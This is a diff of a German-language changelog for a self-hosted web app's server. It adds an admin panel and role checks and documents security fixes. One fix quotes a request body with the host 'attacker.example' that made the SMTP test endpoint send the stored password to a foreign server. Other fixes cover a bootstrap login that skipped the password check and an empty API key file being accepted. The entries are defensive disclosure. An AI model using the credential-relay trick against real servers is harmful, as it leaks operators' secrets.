@@ -7,6 +7,20 @@ Format orientiert sich an [Keep a Changelog](https://keepachangelog.com/de/1.0.0
 
 ## [Unreleased]
 
+### Hinzugefügt
+- **Web: echtes Admin-Panel, alle Server-Einstellungen aus der Web-App erreichbar**: neue Rolle `admin`/`user` je Benutzerkonto, gated per JWT statt des rohen `X-Api-Key`. Der erste registrierte Account wird automatisch Admin (bei einem Neustart eines bestehenden Servers ebenso — `migrateFirstUserToAdmin()`); alternativ tauscht `POST /api/admin/bootstrap` den `X-Api-Key` einmalig gegen ein Admin-Konto ein. Neue Seite „Admin" (nur für Admins sichtbar) mit Benutzerverwaltung (anlegen/Rolle ändern/löschen), Server-Einstellungen (Registrierung, SMTP inkl. Testmail, KI-Anbieter inkl. Verbindungstest), API-Schlüssel-Rotation, Update-Installation und Audit-Log. Neuer Store `data/server_settings.json`: ein im Panel gesetzter Wert (SMTP, Registrierung) überschreibt die entsprechende Umgebungsvariable, die weiterhin als Fallback dient. (#173)
+
+### Geändert
+- **`POST /api/ai/settings` erfordert jetzt eine Admin-Rolle** statt eines beliebigen eingeloggten Kontos — vorher konnte jedes registrierte Haushaltsmitglied den KI-Anbieter/die API-Schlüssel für alle ändern; bewusste Verschärfung im Zuge von #173, nicht nur eine Nebenwirkung.
+- `GET /api/update/check`, `GET /api/logs` und `POST /api/admin/api-key/rotate` akzeptieren jetzt zusätzlich zum `X-Api-Key` ein Admin-JWT (additiv, `X-Api-Key` funktioniert unverändert weiter). `POST /api/update/apply` akzeptiert ein Admin-JWT nur zusammen mit einer frischen Passwort-Bestätigung im Request-Body — das schützt gezielt vor einem gestohlenen Bearer-Token ohne Kenntnis des Passworts (z. B. per XSS exfiltriert), nicht vor jemandem, der das Passwort kennt (der könnte sich einfach neu einloggen); dieser Endpunkt bleibt als dokumentierte RCE-Fläche (`git pull` + `npm install`) bewusst strenger.
+
+Restart-pflichtige Einstellungen (`PORT`, `ALLOWED_ORIGIN`, `SERVICE_NAME`, `JWT_SECRET`, `DATA_DIR`, `NODE_ENV`, `APP_URL`) sind im Admin-Panel weiterhin nur informativ sichtbar, nicht live editierbar — siehe Begründung in der Server-Einstellungen-Sektion und im PR-Beschreibung von #173.
+
+### Fixed
+- **`POST /api/admin/settings/smtp/test` konnte die gespeicherte SMTP-Passwort an einen beliebigen Host senden**: der Host-Override war frei änderbar, während `pass` bei Fehlen still auf den gespeicherten/env-gepinnten Wert zurückfiel. Ein Admin-Bearer-Token allein (ohne Kenntnis des SMTP-Passworts) genügte, um `{"toEmail":"...","host":"attacker.example",...}` zu senden und den Server dazu zu bringen, sich dort mit dem echten Passwort per AUTH LOGIN/PLAIN zu authentifizieren. Ein Host- oder Benutzer-Override erfordert jetzt zwingend ein explizit mitgeschicktes Passwort in derselben Anfrage; das gespeicherte/env-Passwort wird nur noch verwendet, wenn Host und Benutzer unverändert bleiben. (Review-Fund zu #216, `v3/server/src/email.ts`)
+- **`POST /api/admin/bootstrap` prüfte bei einem bereits existierenden Benutzernamen nicht das Passwort**: der `existing`-Zweig prüfte nur die Mindestlänge und stellte dann trotzdem eine gültige Admin-Session aus, ohne Kenntnis des tatsächlichen Passworts nachzuweisen. Praktisch nur erreichbar, wenn `countAdmins() === 0` bei gleichzeitig existierendem Benutzernamen zutrifft — abgesichert durch `migrateFirstUserToAdmin()` bei jedem Start, aber nicht länger allein davon abhängig. (Review-Fund zu #216)
+- **Ein leerer `.api_key`-Datei-Inhalt wurde als gültiger (leerer) API-Schlüssel akzeptiert**: `crypto.timingSafeEqual` vergleicht zwei leere Puffer als gleich, wodurch ein zero-byte `.api_key` (z. B. durch abgebrochenes Schreiben oder volle Festplatte) einen leeren `X-Api-Key`-Header akzeptiert hätte. Der Server verweigert jetzt den Start, wenn `.api_key` existiert, aber leer ist. (Review-Fund zu #216)
+
 ## [3.3.0-rc.1] – 2026-08-08
 
 Erste Vorabversion von 3.3.0. Fünf Fixes plus eine Verbesserung aus einem gezielten Bugfix-Durchlauf über die Web-App und den Server.
